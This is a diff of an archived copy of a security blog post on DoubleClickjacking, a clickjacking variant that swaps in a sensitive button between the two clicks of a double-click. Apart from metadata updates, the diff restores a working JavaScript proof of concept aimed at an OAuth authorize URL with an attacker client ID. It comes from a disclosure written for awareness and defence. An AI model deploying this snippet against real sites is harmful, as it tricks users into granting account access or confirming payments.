@@ -6,9 +6,9 @@ resource: "http://paulosyibelo.com/2024/12/doubleclickjacking-what.html"
 tags: [article, webseclist-reference, en, blog, clickjacking, ui-redress, oauth, abuse-of-functionality, browser-extension, owasp-a04-2021, owasp-a07-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-10T12:59:42+00:00"
+  at: "2026-08-16T00:00:54+00:00"
 status: stable
-stale_after: 2027-08-10
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "http://paulosyibelo.com/2024/12/doubleclickjacking-what.html"
@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2024.md:10"
 commit: ""
-content_sha256: 214312e83d40ee623927304800f44f6a3d847bfe7db6f8f3908bfdcd2125730f
+content_sha256: ca9f411c71a9a4b92e2b7221326b67b7cc8070fdb4cf1cded92b397d011de930
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +34,7 @@ publisher_english: ""
 raw_sha256: 878f9ac04df21152babe2003070907f20a130b269f9dcb26f5dd5d9c0f12d031
 retrieved_from: "http://paulosyibelo.com/2024/12/doubleclickjacking-what.html"
 retrieved_kind: stored
-retrieved_utc: "2026-08-10T12:59:42+00:00"
+retrieved_utc: "2026-08-16T00:00:54+00:00"
 slug: blog-doubleclickjacking-new-era-ui-redressing
 snapshot: 20250522194316
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://paulosyibelo.com/2024/12/doubleclickjacking-what.html>
-- Preserved from: http://paulosyibelo.com/2024/12/doubleclickjacking-what.html (stored) on 2026-08-10
+- Preserved from: http://paulosyibelo.com/2024/12/doubleclickjacking-what.html (stored) on 2026-08-16
 - Capture timestamp: 20250522194316
 - Licence: unknown
 
@@ -101,7 +101,7 @@ One of the important pieces of this attack is exploiting the timing difference b
 
 Below is a code snippet that can be used to create a PoC for this vulnerability class:
 
- ` <script> function openDoubleWindow(url, top, left, width, height) { var evilWindow = window.open(window.location.protocol+"//"+ window.location.hostname+":"+ window.location.port+"/random", "_blank"); evilWindow.onload = function() { evilWindow.document.open(); //plugs the page to be hijacked as opener returnee evilWindow.document.write(` <script> setTimeout(function() { opener.location = "${url}"; }, 1000); </scri`+`pt> <div id="doubleclick" type="button" class="button" style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" >Double Click Here</div> <script> document.getElementById('doubleclick').addEventListener('mousedown', function() { window.close(); }); </scr`+`ipt>`); evilWindow.document.close(); }; } </script> <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with --> <button >Start Demo</button>
+ ` <script> function openDoubleWindow(url, top, left, width, height) { var evilWindow = window.open(window.location.protocol+"//"+ window.location.hostname+":"+ window.location.port+"/random", "_blank"); evilWindow.onload = function() { evilWindow.document.open(); //plugs the page to be hijacked as opener returnee evilWindow.document.write(` <script> setTimeout(function() { opener.location = "${url}"; }, 1000); </scri`+`pt> <div id="doubleclick" type="button" class="button" style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';" onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';">Double Click Here</div> <script> document.getElementById('doubleclick').addEventListener('mousedown', function() { window.close(); }); </scr`+`ipt>`); evilWindow.document.close(); }; } </script> <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with --> <button onclick="openDoubleWindow('https://target.com/oauth2/authorize?client_id=attacker',647, 588.5, 260, 43)">Start Demo</button>
 `
 
 Replace the values for url, top, left, width, and height with the specific button location you want to doublejack.
@@ -190,3 +190,9 @@ Any page handling OAuth scope verification, payment confirmations, or other high
 DoubleClickjacking is a sleight of hand around on a well-known attack class. By exploiting the event timing between clicks, attackers can seamlessly swap out benign UI elements for sensitive ones in the blink of an eye.
 
 Until next time, good luck!
+
+### Share This Story
+
+****Tags:**
+
+  [ Older Post ](https://www.paulosyibelo.com/2024/02/cross-window-forgery-web-attack-vector.html)
